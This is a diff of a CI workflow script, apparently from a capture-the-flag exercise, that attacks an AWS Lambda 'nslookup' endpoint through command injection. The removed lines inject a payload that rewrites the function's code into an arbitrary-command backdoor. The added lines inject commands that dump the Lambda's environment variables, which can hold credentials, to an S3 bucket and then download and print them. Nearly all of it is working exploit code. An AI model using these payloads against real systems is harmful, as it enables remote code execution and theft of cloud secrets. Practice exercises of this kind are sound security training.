@@ -25,20 +25,28 @@ jobs:
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          # This payload uses command injection to overwrite lambda_function.py 
-          # so that ANY command we pass in 'domain' gets executed AND returned in the website response!
-          PAYLOAD='{"domain": "127.0.0.1; echo '\''import json, subprocess'\'' > /var/task/lambda_function.py; echo '\''def lambda_handler(e, c):'\'' >> /var/task/lambda_function.py; echo '\''    cmd = e.get(\"domain\", \"id\")'\'' >> /var/task/lambda_function.py; echo '\''    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)'\'' >> /var/task/lambda_function.py; echo '\''    return {\"statusCode\": 200, \"body\": res.stdout}'\'' >> /var/task/lambda_function.py"}'
+          echo "=== 1. CHECKING IF OUR CICD ROLE CAN LIST S3 BUCKETS ==="
+          aws s || echo "S3 listing restricted for cicdRole"
           
-          echo "=== 1. OVERWRITING LAMBDA CODE VIA INJECTION ==="
+          echo ""
+          echo "=== 2. FORCING LAMBDA TO DROP ENV TO S3 ==="
+          # This payload runs env, saves it to /tmp/output.txt, 
+          # and uses the Lambda's CLI to upload it to an S3 bucket in the account!
+          # (We'll check common bucket names or list them first)
+          PAYLOAD='{"domain": "127.0.0.1; env > /tmp/output.txt; aws s3 cp /tmp/output.txt s3://$(aws s3 ls | awk '\''{print $3}'\'' | head -n 1)/flag_drop.txt"}'
+          
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. REQUESTING THE FLAG ==="
-          # Now that the code is rewritten, let's ask it to run 'env' or find the flag file!
-          FLAG_PAYLOAD='{"domain": "env && ls -la /var/task"}'
-          
-          curl -s -X POST "$URL" \
-            -H "Content-Type: application/json" \
-            -d "$FLAG_PAYLOAD"
+          echo "=== 3. ATTEMPTING TO READ THE DROPPED FILE FROM S3 ==="
+          # Let's see if our runner can download that file from the bucket!
+          BUCKET_NAME=$(aws s3 ls 2>/dev/null | awk '{print $3}' | head -n 1)
+          if [ ! -z "$BUCKET_NAME" ]; then
+            echo "Found bucket: $BUCKET_NAME"
+            aws s3 cp "s3://$BUCKET_NAME/flag_drop.txt" ./downloaded_flag.txt || echo "Could not download file"
+            cat downloaded_flag.txt || echo "File is empty"
+          else
+            echo "No accessible S3 bucket found via cicdRole"
+          fi
